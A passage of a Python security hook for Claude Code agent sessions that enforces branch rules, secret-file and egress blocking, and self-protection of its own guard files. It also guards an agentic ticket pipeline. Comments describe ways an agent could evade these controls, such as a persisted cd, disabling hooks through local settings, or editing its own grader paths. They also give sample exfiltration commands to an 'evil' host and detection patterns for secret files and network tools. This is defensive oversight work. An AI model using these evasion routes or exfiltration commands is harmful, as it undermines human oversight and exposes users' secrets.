#!/usr/bin/env python3
"""
PreToolUse security hook — layer 1 of 3 (see docs/SECURITY.md).
Runs before every Claude Code tool call. Exit 0 = allow. Exit 2 = block
(reason on STDERR — the stream Claude Code relays for a blocking exit 2;
stdout is ignored). Unlike git hooks, the model cannot bypass these — there
is no --no-verify equivalent.

Error posture: Claude Code treats exit 2
as "block" and ANY OTHER non-zero exit (an uncaught exception → exit 1) as a
*non-blocking* error — the tool then RUNS, so a crash silently fails OPEN.
All guards therefore run inside a fail-CLOSED boundary (`_dispatch`, bottom of
file): if a crafted `tool_input` makes a matcher throw, we block instead of
allowing. The workflow guards (branch / merged-PR / cross-worktree) swallow
their own git/gh/network errors and deliberately stay fail-open.

Distilled from a production Claude Code hook suite (v2) — in production
2026-06-23 → 2026-07-03 across a full build (Stages 0–6). The v2 hardening
(prose-stripping, branch-scoped push guard) shipped post-retro on 2026-07-03.
Hardened again 2026-08-23 with later production lessons: stderr block
reasons, path-target secret guard, egress guard, anchored rm flags, widened
self-protection, fail-closed dispatch, and the cwd-based session-root fix for
subagent worktrees — see docs/adr/2026-08-23-hook-hardening-and-session-root.md.
Every guard here is verified by the block/allow battery in test_hooks.py,
which runs in CI.

BOOTSTRAP ORDER WARNING: settings.json hook wiring hot-loads the moment the
file is written, and a missing hook script BLOCKS EVERY TOOL CALL (python
exits 2 = the block signal — the system fails closed). Create the scripts in
.claude/hooks/ FIRST, write settings.json LAST. (Learned the hard way
building this kit — see docs/LESSONS.md.)

Layout:
  1. UNIVERSAL GUARDS — keep these in every project.
  1b. PIPELINE GUARDS — inert unless the project opted into the agentic
     delivery pipeline (docs/PIPELINE-CONTRACT.md); the discriminator is the
     existence of `delivery.json` at the repo root, and everything they trust
     comes from the DISPATCHER (a pin file outside the worktree, config read
     from the default branch), never from the session.
  2. STACK-SPECIFIC GUARDS — Supabase/Postgres examples at the bottom;
     replace them for your datastore, keep the *shape* (protect remote,
     allow local).
"""
import hashlib
import json
import os
import re
import shutil
import subprocess
import sys
from datetime import datetime, timezone


def block(reason: str) -> None:
    # The reason must go to STDERR: for a blocking exit 2, Claude Code relays
    # stderr to the model and IGNORES stdout — printed there, every deny shows
    # up as "PreToolUse:... hook error: ... No stderr output", reason lost.
    print(f"[Security Hook] BLOCKED: {reason}", file=sys.stderr)
    sys.exit(2)


# ════════════════════════════════════════════════════════════════════════════
# 1. UNIVERSAL GUARDS — keep in every project
# ════════════════════════════════════════════════════════════════════════════

# ── Session root: WHICH checkout is this session acting in? ─────────────────
# Hooks are wired as `python3 "$CLAUDE_PROJECT_DIR"/.claude/hooks/…`, and a
# SUBAGENT session inherits CLAUDE_PROJECT_DIR from its PARENT — so for a
# subagent working in its own SDK-created worktree, both the env var and this
# file's location point at the PARENT's checkout. Deriving the session root
# from them falsely blocked every subagent Edit/Write into its own worktree as
# "cross-worktree", and made the branch guards evaluate the PARENT's branch.
# The hook PROCESS's cwd does follow the ACTING session — but it is also
# MODEL-MUTABLE: the hook is spawned with the current session cwd, and the Bash
# tool writes the shell's resulting directory back into that state, so a
# persisted `cd` moves it. Deriving the root from cwd alone would therefore let
# `cd ~/any-other-checkout` switch OFF the branch, branch-naming and
# cross-worktree guards — the very guards CLAUDE.md advertises as unbypassable.
# So the anchor stays CLAUDE_PROJECT_DIR, and cwd may only WIDEN it to a genuine
# subagent worktree: payload has `agent_id` AND the cwd's toplevel shares a
# --git-common-dir with the anchor (see _resolve_root). Roots and compared paths
# are realpath'd so symlinked tempdirs (macOS /var → /private/var) can't defeat
# the comparisons.
_FILE_ROOT = os.path.dirname(
    os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
)
_ENV_ROOT = os.environ.get("CLAUDE_PROJECT_DIR") or _FILE_ROOT


def _cwd_git_toplevel():
    """Git toplevel of the hook process's cwd, or None when not in a repo."""
    try:
        r = subprocess.run(
            ["git", "rev-parse", "--show-toplevel"],
            capture_output=True,
            text=True,
            timeout=3,
        )
        if r.returncode == 0 and r.stdout.strip():
            return os.path.realpath(r.stdout.strip())
    except Exception:
        pass
    return None


def _git_common_dir(d: str):
    """The shared `.git` dir for `d` — IDENTICAL across every worktree of one
    repo, and different for an unrelated repo. This is what makes the widening
    below safe: it proves the cwd is a sibling worktree of CLAUDE_PROJECT_DIR
    rather than just some other checkout the session wandered into."""
    try:
        r = subprocess.run(
            ["git", "-C", d, "rev-parse", "--git-common-dir"],
            capture_output=True,
            text=True,
            timeout=3,
        )
        if r.returncode == 0 and r.stdout.strip():
            return os.path.realpath(os.path.join(d, r.stdout.strip()))
    except Exception:
        pass
    return None


def _resolve_root(data) -> str:
    """The acting session's root, resolved per-invocation from the payload.

    CLAUDE_PROJECT_DIR is the anchor because it is NOT model-mutable. The cwd is
    consulted ONLY to widen to a subagent's own worktree, and only when both
    conditions hold:
      1. the payload carries `agent_id` (the CLI sets it only for a subagent), and
      2. the cwd's git toplevel shares a --git-common-dir with the anchor.
    Either check failing falls back to the anchor. This is deliberate: the hook is
    spawned with the CURRENT session cwd, which a persisted `cd` moves — so a
    cwd-derived root would let `cd ~/other-checkout` switch OFF the branch,
    branch-naming and cross-worktree guards for the rest of the session. Widening
    can only ever move WITHIN one repo's worktrees, never to a foreign repo.
    """
    env_root = os.path.realpath(_ENV_ROOT)
    if not data.get("agent_id"):
        return env_root  # main session → stable anchor, never the cwd
    top = _cwd_git_toplevel()
    if not top:
        return env_root
    common = _git_common_dir(top)
    if common and common == _git_common_dir(env_root):
        return top  # same repo family → a genuine sibling worktree
    return env_root


PROJECT_ROOT = os.path.realpath(_ENV_ROOT)


# ── Branch guard: no edits or commits while on main ─────────────────────────
# Enforces the feature-branch workflow automatically (see docs/COLLABORATION.md).
# Edit/Write and `git commit` are blocked whenever this repo is on a protected
# branch, so starting new work *forces* a branch first. This is what keeps main
# clean and conflict-free when several people (or agents) share the repo.
PROTECTED_BRANCHES = {"main", "master"}
BRANCH_HELP = (
    "You're on `{branch}` in this repo, where direct edits/commits are "
    "blocked (docs/COLLABORATION.md). Create a feature branch first, then retry:\n"
    "  git checkout -b <type>/<short-kebab-desc>\n"
    "  (type = feat | fix | chore | refactor | docs; e.g. feat/grid-drag)\n"
    "Pull latest main before branching if collaborators are active: "
    "git checkout main && git pull && git checkout -b <type>/<desc>"
)


# ── Branch-naming guard: work only happens on a properly-named branch ──────────
# docs/COLLABORATION.md's convention: <type>/<short-kebab-desc>, type in
# feat|fix|chore|refactor|docs. A fresh Claude Code worktree session defaults to
# an auto-generated `claude/<random-codename>` branch (e.g. claude/cool-jones-ca5);
# one such branch once landed UNRENAMED in a real PR. Blocking Edit/Write/commit the same
# way the main/master guard does forces a rename before any work, not just a
# reminder. (Fails open on an empty branch string, e.g. outside a repo.)
# The `ticket` group is OPTIONAL, so the language this accepts is unchanged for
# every project: `feat/grid-drag` matches exactly as before. It exists so the
# pipeline's `ticket-branch` guard can REQUIRE it when `branch.requireTicketId`
# is on (docs/PIPELINE-CONTRACT.md §1). The class is lower-case only, so tracker
# IDs must be lower-cased in a branch name (`feat/eng-123-token-refresh`) and the
# branch-vs-pinned-ID comparison is case-INsensitive.
BRANCH_NAME_RE = re.compile(
    r"^(?:feat|fix|chore|refactor|docs)/"
    r"(?:(?P<ticket>[a-z0-9]+-\d+)-)?"
    r"[a-z0-9][a-z0-9-]*$"
)
BRANCH_NAME_HELP = (
    "Branch `{branch}` doesn't match this repo's naming convention "
    "(`<type>/<short-kebab-desc>`, type = feat|fix|chore|refactor|docs — see "
    "docs/COLLABORATION.md). Rename it before continuing, so an auto-generated "
    "worktree codename never lands in a real PR:\n"
    "  git branch -m <type>/<short-kebab-desc>"
)


def _current_branch() -> str:
    try:
        r = subprocess.run(
            ["git", "-C", PROJECT_ROOT, "rev-parse", "--abbrev-ref", "HEAD"],
            capture_output=True,
            text=True,
            timeout=3,
        )
        return r.stdout.strip() if r.returncode == 0 else ""
    except Exception:
        return ""


def _in_project(path: str) -> bool:
    if not path:
        return False
    try:
        return (
            os.path.commonpath([os.path.realpath(path), PROJECT_ROOT]) == PROJECT_ROOT
        )
    except Exception:
        return False


# ── Cross-worktree write guard: never write into a DIFFERENT checkout ───────────
# The branch guards above only fire for paths INSIDE this worktree (_in_project).
# A write whose path belongs to a SIBLING/PARENT worktree — classically the main
# checkout (on `main`), reached via a persisted `cd` into it — skips every guard and
# lands there SILENTLY: tests/typecheck here still pass against the unmodified files,
# so a whole session's edits can go to the wrong checkout unnoticed (seen in a
# 2026-07-03 retro). Resolve the target's OWNING worktree via `git worktree list` (the
# most-specific/longest root that contains it); if that isn't THIS session's worktree
# (PROJECT_ROOT — the ACTING session's root, resolved from the hook process's cwd, so
# subagents in their own worktrees are judged against THEIR root, not the parent's),
# block. Fails open (no git / not a worktree → owner None → allow), and same-worktree
# writes are untouched (owner == PROJECT_ROOT), so paths outside the repo (scratchpad,
# ~/.claude memory, /tmp) and normal edits are unaffected — the guard cannot lock the
# session out of its own worktree.
CROSS_WORKTREE_HELP = (
    "Cross-worktree write blocked — this path is in a DIFFERENT checkout than your session:\n"
    "  target worktree: {owner}\n"
    "  your session:    {here}\n"
    "Writing into another worktree (especially the MAIN checkout, usually on `main`) lands "
    "there SILENTLY: the branch guard only protects your own worktree, and your tests/typecheck "
    "would still pass against the unmodified files here. Use your OWN worktree's path instead:\n"
    "  {suggested}\n"
    "(Usual cause: a persisted `cd` into another checkout — prefer absolute worktree paths and "
    "`git -C <dir>` over `cd`. If you genuinely must edit the other worktree, do it from a "
    "session rooted there.)"
)


def _worktree_roots():
    """Absolute roots of every git worktree for this repo, or [] on any failure."""
    try:
        r = subprocess.run(
            ["git", "-C", PROJECT_ROOT, "worktree", "list", "--porcelain"],
            capture_output=True,
            text=True,
            timeout=3,
        )
        if r.returncode != 0:
            return []
        return [
            os.path.abspath(line[len("worktree ") :].strip())
            for line in r.stdout.splitlines()
            if line.startswith("worktree ")
        ]
    except Exception:
        return []


def _owning_worktree(path: str, roots):
    """The most-specific (longest) worktree root that contains `path`, or None."""
    try:
        ap = os.path.realpath(path)
    except Exception:
        return None
    best = None
    for root in roots:
        try:
            root = os.path.realpath(root)
            if os.path.commonpath([ap, root]) == root and (
                best is None or len(root) > len(best)
            ):
                best = root
        except Exception:
            continue
    return best


# ── Merged-PR guard: no commits/pushes on a branch whose PR already merged ──────
# A branch pushed with more work after its PR merges is silently stranded: GitHub
# stops syncing that PR's head and stops running CI on further pushes to the
# branch (burned real debugging time before "PR merged" was recognized as the
# cause, 2026-07-03). Only fires once the branch has an upstream (skips fresh
# local-only branches, avoiding a network
# call), and fails open on any gh/network error — never block on something this
# can't verify.
MERGED_PR_HELP = (
    "`{branch}`'s PR (#{number}) is already MERGED. Commits/pushes here would be "
    "silently stranded — GitHub stops syncing a merged PR's head and stops "
    "running CI on further pushes to that branch. Branch fresh off updated main "
    "instead:\n"
    "  git checkout main && git pull --ff-only && git checkout -b <type>/<desc>"
)


def _has_upstream() -> bool:
    try:
        r = subprocess.run(
            ["git", "-C", PROJECT_ROOT, "rev-parse", "--abbrev-ref", "--symbolic-full-name", "@{u}"],
            capture_output=True,
            text=True,
            timeout=3,
        )
        return r.returncode == 0
    except Exception:
        return False


def _merged_pr_info(branch: str):
    """Returns {"number": ...} if `branch` has a MERGED PR, else None. Fails open."""
    if not shutil.which("gh"):
        return None
    try:
        r = subprocess.run(
            ["gh", "pr", "view", branch, "--json", "state,number"],
            cwd=PROJECT_ROOT,
            capture_output=True,
            text=True,
            timeout=5,
        )
        if r.returncode != 0:
            return None
        info = json.loads(r.stdout)
        return info if info.get("state") == "MERGED" else None
    except Exception:
        return None


# ── Self-protection guard: Claude must never edit the hooks that guard it ───────
# Every block above is trivially defeated if Claude can rewrite the hook to delete the
# guard, or edit settings.json to unwire it. So these files are HUMAN-ONLY: the
# Edit/Write tools are blocked outright, and Bash that would mutate them (redirect,
# tee, sed -i, cp/mv/rm, chmod/chown/awk, git checkout/restore/reset/clean/stash/
# apply/rm/mv, any python/node/ruby invocation naming one, …) is blocked too. To
# change one, Claude must hand the HUMAN a terminal command to run — it cannot apply
# the change itself. The running hook protects itself (pre-tool-use.py is in its own
# set). `settings.local.json` is protected too: local settings override project
# scalars, so a session that writes it (disableAllHooks, defaultMode…) could
# neutralize every guard for future sessions — its legitimate uses (env.PATH) go
# through the same human-terminal flow. This is a first line, not a sandbox: a shell
# can't be perfectly fenced by regex, so the real backstop stays git — any change must
# survive a reviewed PR + CI, which re-runs the battery against the committed hook.
# (Reads are allowed: Claude may `Read`/`cat` these files freely; only
# writes/mutations are blocked.)
# Protect the guard files of EVERY root this invocation can see: the acting
# session's root (PROJECT_ROOT) plus the roots the hook was addressed through
# (CLAUDE_PROJECT_DIR / this file's location) — in a subagent worktree those
# differ, and the parent's copies deserve the same protection as the acting
# session's own.
_PROTECTED_REL = (
    ("hooks", "pre-tool-use.py"),
    ("hooks", "audit.py"),
    ("hooks", "stop-pr-check.py"),
    ("settings.json",),
    ("settings.local.json",),
)
def _self_protected_paths() -> set:
    """Recomputed whenever PROJECT_ROOT is resolved, so a subagent's own worktree
    copies are protected too — never only the anchor's."""
    return {
        os.path.join(_root, ".claude", *_rel)
        for _root in {
            PROJECT_ROOT,
            os.path.realpath(_ENV_ROOT),
            os.path.realpath(_FILE_ROOT),
        }
        for _rel in _PROTECTED_REL
    }


SELF_PROTECTED = _self_protected_paths()
SELF_PROTECT_HELP = (
    "🔒 `{path}` is a protected hook file — Claude may not edit it. Editing the "
    "guardrails would let any block be removed, so these files are HUMAN-ONLY. Do not "
    "reach for another tool or a shell workaround — instead, print a terminal command "
    "for the human to run themselves, e.g.:\n"
    "  cp <validated-scratch-copy> {path}\n"
    "and let them run it. (The change still lands via a reviewed PR — CI re-runs the "
    "hook battery against it.)"
)
SELF_PROTECT_BASH_HELP = (
    "🔒 That command would modify a protected hook file (one of: pre-tool-use.py, "
    "audit.py, stop-pr-check.py, .claude/settings.json, .claude/settings.local.json). "
    "These are HUMAN-ONLY — Claude cannot edit or overwrite the guards that constrain "
    "it. Print the change as a terminal command for the human to run themselves "
    "instead; it lands via a reviewed PR. (Reading them — cat/less/grep — is fine.)"
)


def _is_self_protected(path: str) -> bool:
    if not path:
        return False
    try:
        ap = os.path.realpath(path)
        return ap in {os.path.realpath(p) for p in SELF_PROTECTED}
    except Exception:
        return True  # unresolvable path → fail CLOSED


# Bash detection: a write/mutation operator TARGETING a protected file — the path
# must be the operator's target, so an unrelated `2>&1` / `> /dev/null` / `rm other`
# in a command that merely mentions a hook path is NOT a false positive. Read-only
# commands (cat/grep, `python3 <dir>/test_hooks.py`, `cat <hook> > /tmp/x`) do not
# match, so running the battery and reading the hooks stay frictionless. Any
# python/node/ruby invocation NAMING a protected file is blocked (an interpreter can
# rewrite the file no matter which flags it was launched with) — so validate hook
# DRAFTS in a scratch dir under a different filename, not against the live path.
_SELF_PROT = r"(?:pre-tool-use\.py|stop-pr-check\.py|audit\.py|\.claude[/\\]settings(?:\.local)?\.json)"
def _mutate_re(path_re: str):
    """The write/mutation operator scaffold, aimed at whatever path shape is
    passed in. Factored out (behavior-identical for self-protection) so the
    pipeline's grader-path guard applies the SAME operator net to the risk-listed
    paths instead of growing a second, drifting copy."""
    return re.compile(
        r">>?\s*['\"]?[^\s'\"|&;<>]*?" + path_re +                     # redirect INTO the path
        r"|\btee\b[^|;&]*?" + path_re +                                # tee it
        r"|\b(?:sed|perl)\b[^|;&]*\s-[a-zA-Z]*i\b[^|;&]*?" + path_re + # sed -i / perl -i
        r"|\b(?:cp|mv|rm|ln|install|truncate|dd|shred|unlink|chmod|chown|awk)\b[^|;&]*?" + path_re +
        r"|\bgit\b[^|;&]*\b(?:checkout|restore|reset|clean|stash|apply|rm|mv)\b[^|;&]*?" + path_re +
        r"|\b(?:python3?|node|deno|ruby)\b[^|;&]*?" + path_re          # interpreter naming it
    )


_SELF_MUTATE_RE = _mutate_re(_SELF_PROT)


# ── Secret-file target match (Bash) ─────────────────────────────────────────────
# Hardened 2026-08-23. The old guard was a verb denylist (cat/less/
# head/tail/bat/open/more) so `xxd`, `od`, `strings`, `grep`, `base64`,
# `node -e 'readFileSync(".env.local")'`, and `source .env.local && echo $VAR` all
# sailed through. Match the sensitive PATH regardless of the leading command — and
# regardless of WHERE in the command line it appears (deliberately whole-command,
# unlike the per-command-scoped operator guards: `wc x; grep k .env` is still a
# secret read). Lookarounds keep property access from tripping: `process.env` has a
# word char before the dot (.env arm), and `obj.key` is followed by expression
# syntax like `)` — a real file argument ends at whitespace/quote/end, which is what
# the .pem/.key arms require. (An earlier (?!\w) tail false-positived on
# obj.key; the follow-context fixes that — the residual FP is `obj.key` hard against
# a closing quote.) `.env.example` is deliberately exempt.
SENSITIVE_PATH_RE = re.compile(
    r"""
      # .env / .env.local / .envrc / .env_backup … (not .env.example, not process.env)
      (?<!\w)\.env(?![\w.-]*\.example(?=[\s'"]|$))[\w.-]*(?=[\s'"]|$)
      # *.pem / *.key as a FILE argument — the token must be path-shaped (contains a
      # `/` or starts with a word char), so the jq filter `'.key'` cannot match.
      # The lookbehind also excludes `.` and `/` so the match cannot start MIDWAY
      # through a dotted expression: `jq -r '.data.key'` must not match at `data.key`.
    | (?<![\w'"./~-])(?=[\w./~-]*/|[\w~-])[\w./~-]*\.(?:pem|key)(?=[\s'"]|$)
    | (?<!\w)id_rsa(?!\w)                  # ssh private key
      # aws/gcp credentials FILES — a path separator is required, so `git add
      # src/credentials.test.ts` and `npm test -- -t credentials` stay allowed.
    | (?<!\w)(?:~|\.{1,2})?/(?:[\w.~-]+/)*credentials(?:\.\w+)?(?=[\s'"]|$)
    """,
    re.VERBOSE | re.IGNORECASE,
)
# Read/Edit/Write-tool twin of the Bash arms above (basename match).
SENSITIVE_BASENAME_RE = re.compile(r"(?<!\w)(?:id_rsa|credentials)(?!\w)", re.IGNORECASE)


# ── Egress guard: block obvious outbound exfiltration ───────────────────────────
# Added 2026-08-23. The supply-chain guard below stops
# `curl … | bash` (inbound), but nothing stopped OUTBOUND exfil like
# `curl -d @file https://evil` or `curl 'https://evil/?k=$SECRET'` — which under
# bypassPermissions runs with no prompt. We can't enumerate every shape, so this is
# a conservative denylist of the obvious ones: a network tool (curl/wget/scp/sftp/nc)
# talking to a NON-allowlisted host while also uploading data / reading a local file
# / splicing a shell var into the URL, or any raw socket / scp-style push to such a
# host. Plain inbound GETs (downloads) to unknown hosts stay allowed. Host allowlist
# is a domain-boundary suffix match, so `evil-github.com` and `github.com.evil.tld`
# are NOT allowlisted.
EGRESS_ALLOW_SUFFIXES = (
    # ── universal core — hosts any project legitimately talks to ──
    "localhost",
    "127.0.0.1",
    "0.0.0.0",
    "::1",
    "github.com",
    "githubusercontent.com",
    "anthropic.com",       # api.anthropic.com
    "npmjs.org",           # registry.npmjs.org
    # ── STACK-SPECIFIC extension slot — append YOUR project's backends ──
    # (worked example — a managed Postgres backend would add:)
    #   "supabase.co",
    #   "supabase.com",
    "linear.app",          # api.linear.app
    # Add a battery case in test_hooks.py for every suffix you add.
)
NET_TOOL_RE = re.compile(r"(?<![\w./-])(?:curl|wget|scp|sftp|ncat|netcat|nc)(?![\w-])")


def _host_allowlisted(host: str) -> bool:
    host = host.lower()
    return any(host == s or host.endswith("." + s) for s in EGRESS_ALLOW_SUFFIXES)


def _egress_hosts(cmd: str):
    """Best-effort remote hosts targeted by curl/wget/scp/sftp/nc in `cmd`."""
    hosts = []
    # scheme://[user[:pass]@]host[:port]/…
    for m in re.finditer(r"[a-zA-Z][a-zA-Z0-9+.-]*://([^/\s'\"]+)", cmd):
        authority = m.group(1).rsplit("@", 1)[-1]  # drop any user:pass@
        host = authority.split(":", 1)[0].strip("[]")  # drop :port / IPv6 brackets
        if host:
            hosts.append(host)
    # scp/sftp/ssh style user@host:path (no scheme)
    for m in re.finditer(r"(?<![\w./-])[\w.-]+@([\w.-]+):", cmd):
        hosts.append(m.group(1))
    # nc/ncat/netcat: a "host port" pair somewhere in the command
    for m in re.finditer(r"(?<![\w-])(?:nc|ncat|netcat)(?![\w-])([^|;&\n]*)", cmd):
        hm = re.search(
            r"(?<![\w./-])((?:\d{1,3}\.){3}\d{1,3}|[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}|localhost)\s+\d{1,5}\b",
            m.group(1),
        )
        if hm:
            hosts.append(hm.group(1))
    # schemeless curl/wget target that carries a path, e.g.
    # `curl -d @x github.com.evil.tld/collect`. Requiring a trailing "/" (or :port/)
    # keeps a bare upload filename like `report.txt` from being read as a host.
    if re.search(r"(?<![\w-])(?:curl|wget)(?![\w-])", cmd):
        for m in re.finditer(
            r"(?<![\w@./:-])((?:[a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}|(?:\d{1,3}\.){3}\d{1,3})(?::\d+)?/",
            cmd,
        ):
            hosts.append(m.group(1))
    return hosts


# ════════════════════════════════════════════════════════════════════════════
# 1b. PIPELINE GUARDS — inert unless the project opted into the agentic
#     delivery pipeline (docs/PIPELINE-CONTRACT.md). Added 2026-08-24.
# ════════════════════════════════════════════════════════════════════════════
# THE GOVERNING PRINCIPLE: everything a guard trusts comes from the DISPATCHER,
# never from the session. A branch name, a PR body, a ticket comment, an env
# var and every file inside the worktree are all agent-mutable — the kit already
# learned once that a guard's anchor must not be something the model can move
# (docs/adr/2026-08-23-hook-hardening-and-session-root.md). So the pinned ticket,
# the session mode and the ticket snapshot are read from a PIN FILE OUTSIDE the
# worktree, and the pipeline's own config values are read from the COMMITTED copy
# on the default branch (`git show origin/main:delivery.json`), never from the
# working-tree copy the session can edit.
#
# ONE DISCRIMINATOR (contract §2): the pipeline is configured for a project IFF
# `delivery.json` exists at the repo root. Absent → every guard below exits
# immediately, before parsing anything, before touching git or the network. Most
# projects that adopt this kit will never run a pipeline and must see no change
# at all; conflating *off* with *broken* would brick every manual project, and
# because the guard machinery is self-protected the agent could not repair it
# (the hook-bootstrap-order lesson, docs/LESSONS.md).
#
# FAIL DIRECTION: write-blocking and state-transition guards fail CLOSED; checks
# that merely WITHHOLD autonomy from an unpinned (human, ad-hoc) session fail
# OPEN. An adversary must not be able to flip a guard open by inducing an error.
DELIVERY_FILE = "delivery.json"
DELIVERY_VERSION = 1
PIN_VERSION = 1

# The default branch is resolved by trying these refs in order rather than by
# reading `github.defaultBranch` out of the working tree: the working-tree copy
# is inside the agent's worktree, so trusting it to pick the ref we then read the
# trusted values from would be circular.
_CONFIG_REFS = ("origin/main", "origin/master", "main", "master")

PIPELINE_BROKEN_HELP = (
    "🔒 `delivery.json` is present but BROKEN ({source}) — the agentic delivery "
    "pipeline fails closed on a misconfiguration (docs/PIPELINE-CONTRACT.md §2). "
    "Absence of the file is *off* and harmless; presence is a promise. Fix or "
    "remove the file — edits to `delivery.json` itself stay allowed so the repo "
    "is never taken hostage by its own config."
)
PIN_BROKEN_HELP = (
    "🔒 Dispatcher pin {status} for this session root.\n"
    "  pin file:     {path}\n"
    "  session root: {root}\n"
    "A pin binds one session to one ticket, and a reader must verify it "
    "(docs/PIPELINE-CONTRACT.md §3). A malformed pin, or one written for a "
    "different worktree, is a hard stop — not a warning. Ask the dispatcher to "
    "re-dispatch, or delete the stale pin file."
)
GRADER_PATH_HELP = (
    "🔒 `{path}` is a risk-listed (grader) path and this is a PINNED agent "
    "session (mode: {mode}). Guard machinery, CI workflows and the pipeline's own "
    "config are the things that decide whether your work is acceptable — a "
    "session that can edit them can grade its own homework. Changes here need a "
    "human: describe the change in the PR body or file a follow-up ticket "
    "instead. (Configured via `autonomy.riskPaths` in delivery.json; hook "
    "scripts and settings files are blocked unconditionally, pipeline or not.)"
)
GRADER_PATH_BASH_HELP = (
    "🔒 That command would modify a risk-listed (grader) path — CI workflows, "
    "`delivery.json`, or another glob in `autonomy.riskPaths`. In a pinned agent "
    "session those are human-only, for the same reason the hook scripts are: a "
    "session must not be able to edit the machinery that judges it. Reading them "
    "(cat/grep) is fine."
)
TICKET_BRANCH_HELP = (
    "🔒 Branch `{branch}` does not carry this session's pinned ticket ID. "
    "`branch.requireTicketId` is on, so the branch must be "
    "`<type>/{ticket}-<short-kebab-desc>` (the ID lower-cased — the branch-naming "
    "guard rejects upper-case). Rename before continuing:\n"
    "  git branch -m {suggested}"
)
READY_HELP = (
    "🔒 Moving a ticket into the pipeline's `ready` state is an APPROVAL, and "
    "approving work is a human's action. Blocked because {why}\n"
    "Only `epic/<ID>` provenance — work decomposed from an epic a person already "
    "approved — can ever auto-approve; monitor-, review- and retro-filed tickets "
    "always wait in `raw` for a person, because that is precisely the path an "
    "attacker-influenced payload would take to mint itself a mandate. Post a "
    "comment asking for approval instead."
)
OWN_TICKET_HELP = (
    "🔒 This session is pinned to {ticket} and may not write to {targets}. "
    "A `ticket`-mode session writes to its OWN ticket only "
    "(docs/PIPELINE-CONTRACT.md §3) — otherwise one dispatch can reach across the "
    "whole board. Report anything you found out of scope in your PR body, or file "
    "it through a safe-outputs request the dispatcher can act on."
)
OWN_TICKET_UNRESOLVED_HELP = (
    "🔒 This session is pinned to {ticket}, and this issue write names no ticket "
    "the guard can resolve to it. Issue mutations fail CLOSED: pass the human "
    "identifier ({ticket}) rather than an internal UUID so the binding is "
    "checkable. (Comments — the reporting channel — are not affected.)"
)
NO_PINNED_TICKET_HELP = (
    "🔒 This session's pin says `session_mode: ticket` but carries no ticket ID, "
    "so no tracker write can be checked against it. Fails closed: all tracker "
    "writes are blocked until the dispatcher writes a valid pin "
    "(docs/PIPELINE-CONTRACT.md §3)."
)
CREATE_TICKET_HELP = (
    "🔒 A `ticket`-mode session may not create tickets. An agent that can file "
    "its own work items can widen its own mandate one ticket at a time. Put the "
    "out-of-scope bug in your PR body or emit a safe-outputs request; a human (or "
    "the dispatcher, out of session) files it."
)
TEAM_SCOPE_HELP = (
    "🔒 This session's team is `{team}`; the write targets {targets}. "
    "`{mode}`-mode sessions get team-scoped writes, not workspace-wide ones."
)
AC_INTEGRITY_HELP = (
    "🔒 Editing {fields} on {ticket} — this session's OWN in-progress ticket — is "
    "blocked. Review compares the PR against the acceptance criteria snapshotted "
    "at dispatch, so a session that can rewrite its own ACs can make scope creep "
    "look compliant. It is the ticket-layer twin of weakening a test assertion. "
    "Comments and status changes stay allowed: say what changed, and let a human "
    "amend the ticket."
)


def _pipeline_configured() -> bool:
    """Contract §2's ONE discriminator, and nothing that can fail may run ahead of
    it. A working-tree stat: cheap, offline-safe, and loud to defeat (deleting a
    tracked file lands in the diff, and `delivery.json` is itself risk-listed)."""
    try:
        return os.path.isfile(os.path.join(PROJECT_ROOT, DELIVERY_FILE))
    except Exception:
        return False


_CONFIG_CACHE = None


def _read_delivery_config():
    """(config, source) — config values from the COMMITTED copy on the default
    branch, NOT from the working tree. The working-tree copy sits inside the
    agent's worktree; reading it would let a session raise its own budgets or
    blank the state ID this hook matches on. Falls back to the working tree only
    when no candidate ref carries the file at all — the adoption PR, where
    nothing is dispatching anyway. `(None, source)` means BROKEN."""
    global _CONFIG_CACHE
    if _CONFIG_CACHE is not None:
        return _CONFIG_CACHE
    raw, source = None, None
    for ref in _CONFIG_REFS:
        try:
            r = subprocess.run(
                ["git", "-C", PROJECT_ROOT, "show", f"{ref}:{DELIVERY_FILE}"],
                capture_output=True, text=True, timeout=5,
            )
            if r.returncode == 0 and r.stdout.strip():
                raw, source = r.stdout, f"{ref}:{DELIVERY_FILE}"
                break
        except Exception:
            continue
    if raw is None:
        try:
            with open(os.path.join(PROJECT_ROOT, DELIVERY_FILE)) as fh:
                raw, source = fh.read(), f"{DELIVERY_FILE} (working tree — adoption)"
        except Exception:
            _CONFIG_CACHE = (None, DELIVERY_FILE)
            return _CONFIG_CACHE
    try:
        cfg = json.loads(raw)
    except Exception:
        _CONFIG_CACHE = (None, source)
        return _CONFIG_CACHE
    # "A reader that does not recognize the value must refuse to run, not guess."
    if not isinstance(cfg, dict) or cfg.get("version") != DELIVERY_VERSION:
        _CONFIG_CACHE = (None, source)
        return _CONFIG_CACHE
    _CONFIG_CACHE = (cfg, source)
    return _CONFIG_CACHE


def _clean_id(v) -> str:
    """A resolved config ID, or "" for a blank or an unresolved bootstrap
    placeholder token. Guards compare state and label IDs, never display names —
    a rename in the tracker UI must not silently desync a guard (contract §1)."""
    if not isinstance(v, str):
        return ""
    v = v.strip()
    return "" if (not v or "{{" in v) else v


def _parse_iso_utc(s):
    if not isinstance(s, str) or not s.strip():
        return None
    try:
        d = datetime.fromisoformat(s.strip().replace("Z", "+00:00"))
    except Exception:
        return None
    return d if d.tzinfo else d.replace(tzinfo=timezone.utc)


def _pin_path(cfg) -> str:
    root = ((cfg.get("dispatch") or {}).get("pinsRoot") or "~/.claude/pipeline/pins")
    root = os.path.expanduser(root if isinstance(root, str) else "")
    key = hashlib.sha256(PROJECT_ROOT.encode("utf-8")).hexdigest()[:16]
    return os.path.join(root, key + ".json")


def _read_pin(cfg):
    """(pin, status, path). status ∈ ok | absent | malformed | mismatch.

    `absent` covers a genuinely missing pin AND an expired one — contract §3:
    "past it, the pin is stale; readers treat it as absent". Absence never GRANTS
    autonomy (the approval guard still fails closed), but it must not brick a
    human's ad-hoc session in a configured repo either."""
    path = _pin_path(cfg)
    try:
        if not os.path.isfile(path):
            return None, "absent", path
        with open(path) as fh:
            pin = json.load(fh)
    except Exception:
        return None, "malformed", path
    if not isinstance(pin, dict) or pin.get("pin_version") != PIN_VERSION:
        return None, "malformed", path
    exp = _parse_iso_utc(pin.get("expires_at"))
    if exp is None:
        return None, "malformed", path
    if exp <= datetime.now(timezone.utc):
        return None, "absent (expired)", path
    wt = pin.get("worktree")
    try:
        if not isinstance(wt, str) or os.path.realpath(wt) != PROJECT_ROOT:
            return None, "mismatch", path
    except Exception:
        return None, "mismatch", path
    return pin, "ok", path


